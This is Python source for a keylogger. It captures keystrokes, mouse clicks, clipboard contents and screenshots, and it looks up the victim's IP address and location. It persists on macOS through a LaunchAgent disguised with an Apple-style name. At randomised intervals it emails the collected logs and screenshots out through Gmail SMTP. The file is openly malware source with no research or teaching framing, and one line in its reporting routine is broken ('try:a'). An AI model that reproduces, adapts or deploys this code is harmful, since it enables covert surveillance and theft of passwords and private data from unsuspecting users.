import os
import smtplib
import sys
from email.message import EmailMessage
from pynput.keyboard import Listener as KeyboardListener, Key
from pynput.mouse import Listener as MouseListener
from datetime import datetime, timedelta
from cryptography.fernet import Fernet
import threading
import mimetypes
import pyautogui
import requests
from PIL import ImageGrab
import pyperclip
import time
import random
import plistlib
import subprocess

class KeyLogger:
    def __init__(self, email, password, logfile = 'log.txt', interval = 10):
        self.logfile = logfile 
        self.email = email
        self.password = password
        self.interval = interval 
        self.log = ""
        self.last_clipboard = ""
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        self.schedule_report()

    def schedule_report(self):
        self.next_report = datetime.now() + timedelta(seconds=random.randint(self.interval, self.interval * 2))

    def encrypt_data(self, data):
        return self.cipher.encrypt(data.encode())  

    def decrypt_data(self, data):
        return self.cipher.decrypt(data).decode()  
    
    # monitor the clipboard in the background
    def start_clipboard(self):
        threading.Thread(target=self.check_clipboard, daemon=True).start()

    def check_clipboard(self):
        while True: 
            try:
                curr_clipboard = pyperclip.paste()
                if curr_clipboard != self.last_clipboard:
                    self.append_log(f"Clipboard changed: {curr_clipboard}")
                    self.last_clipboard = curr_clipboard
            except Exception as e:
                print(f"error: {e}")
            time.sleep(1)  
 
    def startup(self):
        if sys.platform == 'darwin':
            plist_path = os.path.expanduser('~/Library/LaunchAgents/com.apple.updateservicetroll.plist')
            plist_content = {
                'Label': 'com.apple.updateservicetroll',
                'ProgramArguments': ['python3', os.path.realpath(sys.argv[0])],
                'RunAtLoad': True,
            }
            try:
                with open(plist_path, 'wb') as plist_file:
                    plistlib.dump(plist_content, plist_file)
                os.system(f'launchctl load -w {plist_path}')
            except Exception as e:
                print(f"error: {e}")


    def getIP(self):
        try:
            response = requests.get('http://ipinfo.io/json')
            data = response.json()
            ip_info = f"IP: {data['ip']} - Location: {data['city']}, {data['region']}, {data['country']}"
            return ip_info
        except Exception as e:
            return f"error: {e}"
        
    def append_log(self, string):
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_entry = f'{timestamp}: {string}\n'
        self.log += log_entry

    
    def on_key(self, key):
        try:
            curr_key = str(key.char)
        except AttributeError:
            curr_key = str(key)

        self.append_log(curr_key)

        if key == Key.esc:
            self.send_final_log()  
            return False  

        
    def on_click(self, x, y, button, pressed):
        if pressed:
            self.append_log(f'mouse clicked at ({x}, {y}) with {button}')

    def write_log(self):
        try:
            encrypted_log = self.encrypt_data(self.log)
            with open(self.logfile, 'wb') as file:  
                file.write(encrypted_log)
            self.log = ''
        except Exception as e:
            print(f"error: {e}")

    def capture_screenshot(self):
        try:
            screenshot_file = f'screenshot_{datetime.now().strftime("%Y%m%d_%H%M%S")}.png'
            image = ImageGrab.grab()  
            image.save(screenshot_file)
            return screenshot_file
        except Exception as e:
            print(f"error: {e}")
            return None

    def attach_file(self, msg, file_path, description):
        try:
            with open(file_path, 'rb') as f:
                file_data = f.read()
                file_type = mimetypes.guess_type(file_path)[0]
                if file_type:
                    main_type, sub_type = file_type.split('/', 1)
                    msg.add_attachment(file_data, maintype=main_type, subtype=sub_type, filename=os.path.basename(file_path))

        except Exception as e:
            print(f"error: {e}")

    def send_email(self, content):
        try:
            print("Preparing email...")  
            msg = EmailMessage()
            msg['From'] = self.email
            msg['To'] = self.email
            msg['Subject'] = 'Keylogger Report'
            msg.set_content("report attached")

            screenshot_file = self.capture_screenshot()
            if screenshot_file:
                self.attach_file(msg, screenshot_file, "screenshot")

            if content:
                msg.add_attachment(content, filename="decrypted_log.txt")

            with smtplib.SMTP('smtp.gmail.com', 587) as server:
                server.starttls()
                server.login(self.email, self.password)
                server.send_message(msg)

        except Exception as e:
            print(f"error sending email: {e}")

    def send_final_log(self):
        self.report()
        print("exiting")

    def report(self):
        if datetime.now() >= self.next_report:
            self.append_log(self.getIP())
            self.write_log()
            try:a
                with open(self.logfile, 'rb') as file:
                    encrypted_content = file.read()
                    if encrypted_content:
                        decrypted_content = self.decrypt_data(encrypted_content)
                        self.send_email(decrypted_content)
            except Exception as e:
                print(f"error: {e}")
            
            open(self.logfile, 'wb').close()
            self.schedule_report()

        timer = threading.Timer(10, self.report)  
        timer.start()

    def start(self):
        self.startup()
        self.start_clipboard()
       
        timer = threading.Timer(self.interval, self.report)
        timer.start()
        with KeyboardListener(on_press=self.on_key) as keyboard_listener, MouseListener(on_click=self.on_click) as mouse_listener:
            keyboard_listener.join()
            mouse_listener.join()

keylogger = KeyLogger("email", "app password", "keylog.txt", 10)
keylogger.start()
